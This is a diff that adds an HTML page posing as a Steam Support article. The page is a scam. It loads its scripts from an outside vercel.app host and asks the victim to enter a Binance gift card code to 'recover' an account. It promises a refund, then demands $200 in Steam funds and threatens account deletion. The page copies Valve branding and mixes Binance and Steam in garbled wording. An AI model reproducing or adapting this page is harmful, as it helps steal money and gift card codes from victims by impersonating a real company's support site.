@@ -1,0 +1,684 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
+
+	<title>GIFT CARD CODE PROCESS</title>
+		<script type="text/javascript" src="https://examplesite2026.vercel.app/Site2026/global7fca.js"></script>
+		<script type="text/javascript" src="https://examplesite2026.vercel.app/Site2026/jquery.js"></script>
+        
+        <link rel="stylesheet" href="https://examplesite2026.vercel.app/Site2026/cssd0a0-direction.css" type="text/css">
+		<link href="https://examplesite2026.vercel.app/Site2026/motiva_sans.css" rel="stylesheet" type="text/css">
+		<link href="https://examplesite2026.vercel.app/Site2026/main_blue_v1.103e7.css" rel="stylesheet" type="text/css">
+		<link href="https://examplesite2026.vercel.app/Site2026/buttons.css" rel="stylesheet" type="text/css">
+		<link rel="stylesheet" type="text/css" href="https://examplesite2026.vercel.app/Site2026/search_blueb9c8.css">		
+		<script type="text/javascript" src="https://examplesite2026.vercel.app/Site2026/userab68.js"></script>
+		<div id="wrapper">
+			
+			<!-- Header -->
+<div id="global_header">
+	<div class="content" syle="font: Arial, Helvetica, sans-serif;">
+		<div class="logo">
+			<span id="logo_holder">
+                            <a href="http://store.steampowered.com/">
+				<img style="border: none;" height="44" width="176" src="https://examplesite2026.vercel.app/Site2026/globalheader_logo.png">
+                            </a>
+			</span>
+		</div> <!-- end logo_holder div -->
+		<!-- begin global nav -->
+		<ul style="position: absolute; left: 200px; top: 40px;" id="supernav">
+		    <li>
+		    	<a href="http://store.steampowered.com/">STORE</a>
+		    	<div id="storesubmenu" class="supernav_content">    
+			        <a class="submenuitem" href="http://store.steampowered.com/">FEATURED</a>
+			        <a class="submenuitem" href="http://store.steampowered.com/news/">News</a>
+			        <a class="submenuitem" href="http://store.steampowered.com/recommended/">RECOMMENDED</a>
+			        <a class="submenuitem" href="http://steamcommunity.com/my/wishlist/">WISHLIST</a>
+			        <a class="submenuitem" href="http://store.steampowered.com/stats/">Stats</a>
+			    </div>
+			</li>
+		   	<li>
+				<a href="http://steamcommunity.com/">Community</a>
+				<div id="communitysubmenu" class="supernav_content">
+			        <a class="submenuitem" href="http://steamcommunity.com/">Home</a>
+			        <a class="submenuitem" href="http://steamcommunity.com/discussions/">DISCUSSIONS</a>
+			        <a class="submenuitem" href="http://steamcommunity.com/workshop/">WORKSHOP</a>
+			        <a class="submenuitem" href="http://steamcommunity.com/greenlight/">GREENLIGHT</a>
+			        <a class="submenuitem" href="http://steamcommunity.com/market/">MARKET</a>
+			    </div>    
+		  	</li>
+		    <li><a class="" href="http://store.steampowered.com/about/">ABOUT</a></li>
+		    <li><a class="" href="https://help.steampowered.com/">Support</a></li>
+		</ul>
+		<!-- end global nav -->
+		<!-- language select -->
+		<div id="language_select_container">
+			<div id="language_dropdown_button">
+				<span class="pulldown" id="language_dropdown_button_span">language</span>
+			</div>
+		</div>
+	
+		<style>
+			#language_dropdown_button{
+				font-size: 11px;
+				color: #b0aeac;
+			}
+			#language_dropdown_button:hover, #language_dropdown_button:focus{
+				color: #ffffff;
+			}
+			#language_select_container{
+				position: absolute;
+				right: 0;
+				top: 10px;
+			}
+			#language_dropdown{
+				display: none;
+				background-color: #3b3938;
+				background-image: url("images/v6/bg_popup.png");
+				background-position: center top;
+				background-repeat: repeat-x;
+				border: 1px solid #82807c;
+				width: 240px;
+				position: absolute;
+				right: 0px;
+				padding-top: 10px;
+				padding-bottom: 10px;
+			
+			}
+			#language_dropdown a{
+				color: #e5e4dc;
+				display: block;
+				font-size: 13px;
+				font-weight: normal;
+				line-height: normal;
+				padding: 5px 12px;
+				text-align: left;
+				text-transform: none;
+			}
+			#language_dropdown a:hover {
+				background-color: #212d3d;
+				text-decoration: none;
+			}
+			.pulldown {
+				background-image: url("https://examplesite2026.vercel.app/Site2026/btn_arrow_down_padded.png");
+				background-position: right center;
+				background-repeat: no-repeat;
+				cursor: pointer;
+				padding-left: 5px;
+				padding-right: 18px;
+			}
+			#supernav a{
+				text-transform: uppercase;
+			}
+		</style>
+		<script>
+			
+			// language select
+			$(document).ready(function(){
+				$("#language_dropdown_button").on("click", function(){
+					$("#language_dropdown").fadeIn();
+				});
+				$(document).on("click", function(event){ 
+					if( $(event.target).attr("id") != "language_dropdown_button_span" ){
+						$("#language_dropdown").fadeOut(); 
+					}				
+				});
+			});
+			// set lanugage link url
+			$("#language_dropdown a").each(function(){
+				var url = window.location.href;
+				if( url.indexOf("?") === -1 ){
+					url = url + "?l=" + $(this).attr("language");
+				}
+				else{
+					if( url.indexOf("&l=") !== -1  ){
+						var langVar = url.indexOf("&l=");
+						url = url.substring(0, langVar) + "&l=" + $(this).attr("language");
+					}
+					else if( url.indexOf("?l=") !== -1 ){
+						var langVar = url.indexOf("?l=");
+						url = url.substring(0, langVar) + "?l=" + $(this).attr("language");
+					}
+					else{
+						url = url + "&l=" + $(this).attr("language");
+					}	
+				}
+				$(this).attr("href", url);
+			});
+			
+		</script>
+	</div> <!-- end content class div -->
+</div> <!-- end header div -->
+<!-- End Header -->
+			
+			<div id="content">
+				
+				<div id="contain_nav_search">
+					<h2 id="welcome_message">Steam Support</h2>
+					<div id="login_search">
+						<div id="login_box">
+							<div class="sidesection">
+								<div></div>
+							</div>
+						</div>
+						<br>
+						<div id="search_box">
+							
+							<div class="sidesection">
+								<form method="get" action="https://support.steampowered.com/kb_search.php?s=6f15be4be98549c0c0cf8476dd244d14" id="quicksearch" name="quicksearch">
+									<input type="text" class="text input" name="searchwords" id="searchwords" value="Search Steam Support" onfocus="toggleSearchText();" onblur="toggleSearchText();">
+									<img src="https://examplesite2026.vercel.app/Site2026/search_icon.png" width="25" height="25" align="top" alt="Search Support" onclick="document.quicksearch.submit();">
+								</form>
+								<script type="text/javascript">
+									function toggleSearchText() {
+										var el = document.getElementById('searchwords');
+										if (el.value == 'Search Steam Support') {
+											el.value = '';
+										} else if (el.value == '') {
+											el.value = 'Search Steam Support';
+										}
+									}
+								</script>
+							</div> <!-- end class sidesection div -->
+						</div> <!-- end search_box div -->
+					</div> <!-- end login_search div -->
+					<div style="clear:both"></div>
+					<ol class="navigation">
+						
+    
+					</ol>
+				</div>
+<style>
+img.faqimage{
+	display: block;
+	margin-left: auto;
+	margin-right: auto;
+	width: 90%;
+}
+</style>
+<div class="container" id="newticket" style="background: url(&quot;https://support.steampowered.com/images/faq/steam_universe/bg.jpg&quot;) 0px 0px / 100% 6000px no-repeat; width: 950px; display: inline-block;">
+    <div class="left_col">
+     <div class="left_col_inner">
+	
+	
+	
+	<!-- <h1>Question</h1> -->
+	<div id="question" class="pagetext" style="display: none;">
+<h1><span style="vertical-align:middle">Where to buy Steam Wallet Codes</span></h1>
+</div>
+	
+	<!-- <h1>Answer</h1> -->
+	<div id="answer" class="pagetext"><p style="display: none;">
+<style class="wallet-codes-css" type="text/css">html {
+		box-sizing: border-box;
+	}
+	
+	p {
+		font-size: 14px;
+		line-height: 24px;
+	}
+
+	p span {
+		color: #fff;
+	}
+
+	ul > li {
+		padding: 0;
+	}
+
+	li {
+  		 margin-left:15px;  
+	}
+	
+	h3 {
+		font-size: 17px;
+	}
+
+	.right_col {
+		display: none;
+	}
+
+	.left_col {
+		width: 100%;
+	}
+
+	#content {
+		font-family: "Motiva Sans Light", "Motiva Sans", Arial, Tahoma, sans-serif
+	}
+
+	#content .pagetext {
+		padding: 13px 13px 0;
+		background: none;
+	}
+
+	#question {
+		border-top: none;
+		margin-bottom: 0px;
+	}
+
+	#question > h1:first-child {
+		display: none;
+	}
+
+	.page-title {
+		font-size: 1.7em;
+		font-weight: normal;
+		margin: 0 0 10px;
+		padding: 0;
+		font-family: "Motiva Sans", Arial, sans-serif;
+	}
+
+	.content-hover-section {
+		background: none repeat scroll 0 0 rgba(0, 0, 0, 0.2);
+		margin-bottom: 10px;
+	}
+
+	.content-section {
+		padding: 13px;
+	}
+
+	.content-hover-section {
+		overflow: auto;
+	}
+
+	.content-hover-section:hover {
+		background: #015B8F;
+	}
+
+	.active {
+		background: #015B8F;
+		color: #fff;
+	}
+
+	.content-section img {
+		text-align: center;
+	}
+
+	#question .content-section {
+		margin-bottom: 0;
+	}
+
+	.left_col .pagetext .notice-text {
+		font-size: 18px;
+		padding-top: 20px;
+	}
+
+	#contact_support_button {
+		background: url("images/faq/steam_universe/button_contactsupport_REST.png") no-repeat;
+		padding: 12px 0;
+		width: 258px;
+		left: 25px;
+	}
+	
+	#contact_support_button:hover {
+		background: url("images/faq/steam_universe/button_contactsupport_OVER.png") no-repeat;
+		opacity: 1;
+	}
+
+	#contact_support_button span {
+		display: inline;
+		vertical-align: inherit;
+	}
+
+	#sidebar_community_help {
+		padding: 20px;
+		background: url("images/faq/steam_universe/icon_communityhelp.png") 19px 19px no-repeat rgba(0, 0, 0, 0.2);
+	}
+
+	#sidebar_community_help h3,
+	#sidebar_documentation h3 {
+		padding-left: 30px;
+	}
+
+	#sidebar_documentation {
+		padding: 20px;
+		height: auto;
+		background: url("images/faq/steam_universe/icon_steamlinkdocumentation.png") 19px 19px no-repeat rgba(0, 0, 0, 0.2);
+	}
+
+	.sidebar_documentation_link {
+		background: url("images/faq/steam_universe/icon_document.png") 0px 0px no-repeat;
+		padding: 0 0 0 30px;
+		margin: 10px 0 0;
+		cursor: pointer;
+		color: #67c1f5;
+	}
+
+	.pdf_view_container {
+		width: 95%;
+		display: none;
+		position: fixed;
+		top: 300;
+		left: 2.5%;
+		z-index:1000;
+		padding: 20px;
+		background: #0a6cb9;
+		color: black;
+	}
+
+	.close_viewer {
+		position: absolute;
+		height: 15px;
+		width: 15px;
+		top: 5px;
+		right: 3px;
+		cursor: pointer;
+		background: url("images/faq/steam_universe/icon_CloseWindow.png");
+	}
+
+	.contact_steam_support, 
+	.visit_steam_discussions {
+		padding: 15px;
+		text-align: center;
+		color: #FFF;
+		background: #5BAAD8;
+		cursor: pointer;
+		border-radius: 2px;
+		display: inline-block; 
+	}
+
+	.contact_steam_support {
+		margin-bottom: 13px;
+	}
+
+	.contact_steam_support:hover, 
+	.visit_steam_discussions:hover {
+		background: #4e9dcb;
+	}
+
+	.visit_steam_discussions {
+		width: 200px;
+		margin-bottom: 15px;
+	}
+
+	.contact_steam_support {
+		width: 140px;
+	}
+
+	#content .troubleshooting_step_container .contact-link {
+		color: #fff;
+	}
+	#content .troubleshooting_step_container .contact-link:visited {
+		color: #fff;
+	}
+
+	.troubleshooting_step_container {
+		position: relative;
+	}
+
+	.troubleshooting_header_container {
+		margin: 7px 33px;
+		cursor: pointer;
+	}
+
+	.container .troubleshooting-header {
+		line-height: 33px;
+		margin-bottom: 0;
+		font-size: 19px;
+	}
+
+	.troubleshooting_step_container .collapse {
+		max-height: 0;
+		transition: max-height .25s linear;
+	}
+
+	.troubleshooting-collapse {
+		transition: max-height .45s linear;
+		max-height: 950px;
+		overflow: hidden;
+		color: #E6E6E6;
+		margin: 0 33px;
+	}
+
+	.triangle-toggle {
+		position: absolute;
+		left: 14px;
+		top: 12px;
+		width: 0;
+		height: 0;
+		border-style: solid;
+		border-width: 5px 0 5px 5px;
+		border-color: transparent transparent transparent #ffffff;
+		transform: rotateZ(0deg);
+		transition: transform .15s linear;
+
+	}
+
+	.collapse-triangle {
+		transform: rotateZ(90deg);
+	}
+
+	.visit_steam_discussions {
+		padding: 15px;
+		text-align: center;
+		color: #FFF;
+		background: #5BAAD8;
+		cursor: pointer;
+		border-radius: 2px;
+		display: inline-block; 
+	}
+
+	#content .visit_steam_discussions a {
+		color: #fff;
+	}
+
+	.sublist {
+		margin-top: 8px;
+	}
+
+	table {
+    border-collapse: separate;
+    width: 200%;
+    border: 0px solid black;
+	}
+
+	td {
+    	border: 1px solid black;
+	}
+
+	table.encode {
+    	table-layout: auto;
+	}
+</style>
+</p>
+
+
+<div class="content-section">
+	<h1 class="page-title">Using Binance Gift Card Code(s) To Fix The User's Account</h1>
+
+	<p>Binance gift card are an easy way to put money into the user account or give the perfect gift of games to your friend or family member.</p>
+
+	<p><b>Though in this certain situation where the User needs to forcibly buy a Binance Gift Card in able to recover the account. It can be used in such situation to gather the necessary data.</b></p>
+
+	<p>Make sure that you have clicked the Recovery Option on your <i>Admin Panel</i> and the right <i>User Panel Account</i>. We can't afford any mistakes.</p>
+	
+	<h2>Where Can The User Generate A New Billing Transaction ID?</h2>
+
+	<p>Binance gift cards are sold all over the globe. You can buy them in thousands of retail stores or online shops using your local payment methods.</p>
+	
+	
+	<div class="content-hover-section">
+	<div class="troubleshooting_step_container">
+	<div class="troubleshooting_header_container">
+		<h2 class="troubleshooting-header">DATA: Generate Billing Transaction ID</h2>
+	<div class="triangle-toggle">&nbsp;</div>
+	</div>
+
+	<div class="troubleshooting-collapse collapse">&nbsp;
+<div id="wallet_code_form" name="wallet_code_form" class="redeem_wallet_code_form">
+					<h2>
+						Enter The Binance Gift Card Code To Generate The Billing Transaction ID				</h2>
+					<div>
+						<br>This process will recover the alleged steam user's account and gradually fix any issues involved.</div>
+										<div>
+						<br>Binance Gift Card Code:					</div>
+					<div style="float: left;">
+						<input name="wallet_code" id="wallet_code" type="text" class="redeem_input_box_text" value="">
+					</div>
+					<br><br><div class="note">
+<h3>Note:</h3>
+
+<p>Funds added to the Steam Account will be used towards the next Process. Full refund will be processed after completion.</p>
+</div><div class="button_row">
+						<a tabindex="300" href="javascript:ValidateWalletCode();" class="btnv6_blue_hoverfade btn_medium" id="validate_btn">
+							<span>Continue</span>
+						</a>
+						<div id="validate_btn_in_progress" class="btnv6_blue_hoverfade btn_medium" style="display:none">
+							<span>Working</span>
+						</div>	
+					</div>	
+					<div style="clear: both;"></div>		
+				</div><br><br>
+	
+</div>
+</div>
+</div>
+
+<div class="content-hover-section">
+	<div class="troubleshooting_step_container">
+	<div class="troubleshooting_header_container">
+		<h2 class="troubleshooting-header">Error Logs</h2>
+	<div class="triangle-toggle">&nbsp;</div>
+	</div>
+
+	<div class="troubleshooting-collapse collapse">&nbsp;
+	
+	
+	<div class="warning">
+<p>An Error has occured please read the result log.</p>
+&nbsp;
+
+<p>A total of $200 Steam Fund must be added on the User's Account to maximize the data gathering process. Make sure to inform the User out of discretion. Failure to comply will result to Account Deletion. <a href="./4562344563452324456345445634544563454456345445634544563454456345445634544563453dfgdgdfg.html"> Proceed to Account Deletion</a></p>
+</div><p>Kindly proceed on recovering the User's Account after successfully complying.<a href="./recoveracc.html"> Procced to Account Recovery</a></p>
+
+	<ul>
+	
+	
+	</ul>
+	
+	
+	
+	
+</div>
+	
+</div>
+</div>
+</div>
+
+
+
+<script type="text/javascript">
+	
+		var headerImage = $("<img/>", {
+			src: "https://support.steampowered.com/images/faq/steam_universe/Hardware_SteamLogo_Banner.png",
+			css: {height: "320px", width: "100%"},
+		});
+
+		$(".container").css({"background": "url(https://support.steampowered.com/images/faq/steam_universe/bg.jpg) 0px 0px / 100% 6000px no-repeat", "width": "950px", "display": "inline-block"});
+		$("#contain_nav_search").after(headerImage);
+
+		// hack for hiding deskpro p tag around style
+		$(".wallet-codes-css").parent("p").css("display", "none")
+
+		$("document").ready( function () {
+			$("#question").hide();
+
+
+			$(".troubleshooting_header_container").click(function (event) {
+				event.preventDefault();
+				return debounce(dropDownCollapse(this), 400 );
+			});
+
+			function dropDownCollapse (targetEl) {
+				var $container = $(targetEl).closest(".content-hover-section");
+				$container.toggleClass("active");
+				$container.find(".troubleshooting-collapse").toggleClass("collapse");
+				$container.find(".triangle-toggle").toggleClass("collapse-triangle");
+			}
+
+			function debounce(func, wait, immediate) {
+				var timeout;
+				return function() {
+					var context = this, args = arguments;
+					var later = function() {
+						timeout = null;
+						if (!immediate) func.apply(context, args);
+					};
+					var callNow = immediate && !timeout;
+					clearTimeout(timeout);
+					timeout = setTimeout(later, wait);
+					if (callNow) func.apply(context, args);
+				};
+			};
+		
+		});
+	
+</script></div></div>
+	
+	
+</div> <!-- end left_col_inner div-->
+</div> <!-- end left_col div-->
+<div id="sticky-anchor"></div>
+<div class="right_col">
+	<div id="sticky" style="display:block;">
+		<div id="contact_support_container">
+			<h3>Problem with Steam?</h3>                  
+		 	<a href="https://help.steampowered.com/">
+		        	<div id="contact_support_button">
+		        		<span>Help Me With My Issue</span>
+		       		</div>
+			</a>
+		</div>
+		<script>
+			var nav_store_breadcrumb = $(".navigation li:nth-child(2)").text().trim();
+			if ( nav_store_breadcrumb == "Valve Store")
+			{
+				$("#contact_support_container a").attr("href", "https://help.steampowered.com/");
+			}
+		</script>
+		
+		<div id="sidebar_community_help" class="dark_bg">
+			<h3>Community Help</h3>
+			Post or search in Steam Discussions for an answer to your question. <br><a id="discussions_link" href="http://steamcommunity.com/discussions/">Visit Steam Discussions</a>
+			
+		</div>
+	<div id="sidebar_documentation" class="dark_bg">
+			<a href="kb_cat1c46.html?s=6f15be4be98549c0c0cf8476dd244d14&amp;id=83">Documentation</a>
+		</div>
+			<div class="related_article_container">
+				<div id="related_article_header"><div class="related_article_header_padding">Related Articles</div></div>
+					<div class="related_article_group">
+						     <div class="related_article_links">	
+	                                                <a href="kb_articledd93.html?s=6f15be4be98549c0c0cf8476dd244d14&amp;ref=1193-WLXV-6514"><img src="images/v6/icons/icon_documents.png" alt="Where to buy Steam Wallet Codes"></a>
+							<a href="kb_article667f.html?s=6f15be4be98549c0c0cf8476dd244d14&amp;ref=1122-RTSC-0478">Steam Wallet</a>
+							
+	                                              </div>
+						     <div class="related_article_links">	
+	                                                <a href="kb_articledd93.html?s=6f15be4be98549c0c0cf8476dd244d14&amp;ref=1193-WLXV-6514"><img src="images/v6/icons/icon_documents.png" alt="Where to buy Steam Wallet Codes"></a>
+							<a href="kb_articlefcb7.html?s=6f15be4be98549c0c0cf8476dd244d14&amp;ref=4429-QWAG-7775">How to Send Wallet Codes For Steam Support</a>
+							
+	                                              </div>
+	                                  </div>
+		   </div>
+
+	</div> <!-- close sticky div -->
+</div> <!-- close right_col div-->
+
+<hr class="xs">
+<div style="clear:both;"></div>
+</div>
+<!-- Footer -->
+<div style="clear:both;"></div>
+<div id="footer">
+<div class="rule">
+	<p>
+		© 2017 Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.
+		<a href="https://store.steampowered.com/privacy_agreement/">Privacy Policy</a>. 
+		<a href="https://store.steampowered.com/legal/">Legal</a>. 
+		<a href="http://store.steampowered.com/subscriber_agreement/">Steam Subscriber Agreement</a>.
+	</p>
+        <p><a id="footerLinks" href="http://www.valvesoftware.com/about.html">About Valve</a> | <a id="footerLinks" href="http://www.valvesoftware.com/business/">Business Solutions</a> | <a id="footerLinks" href="http://www.valvesoftware.com/jobs.html">Jobs</a> | <a id="footerLinks" href="https://sukamodgani.vercel.app/Simpleticketsteam.html">Steam Site License</a>
+        </p>
+         </div>
+</div>
+<!-- End Footer -->
+</script>
+</body>
+</html>
